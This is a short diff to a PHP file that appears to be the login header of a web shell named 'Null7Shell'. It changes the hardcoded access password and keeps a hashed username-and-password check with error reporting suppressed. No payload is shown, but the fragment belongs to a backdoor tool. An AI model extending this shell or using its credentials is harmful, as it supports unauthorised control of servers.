@@ -4,7 +4,7 @@ error_reporting(E_ERROR | E_PARSE);
 session_start();
 
 define('N7_USER', 'null7');
-define('N7_PASS', 'null7ganteng@gmail.com');
+define('N7_PASS', '@Null1337');
 define('N7_HASH', hash('sha256', N7_USER . '::' . N7_PASS));
 define('N7_NAME', 'Null7Shell');
 define('N7_AUTHOR', 'null7');
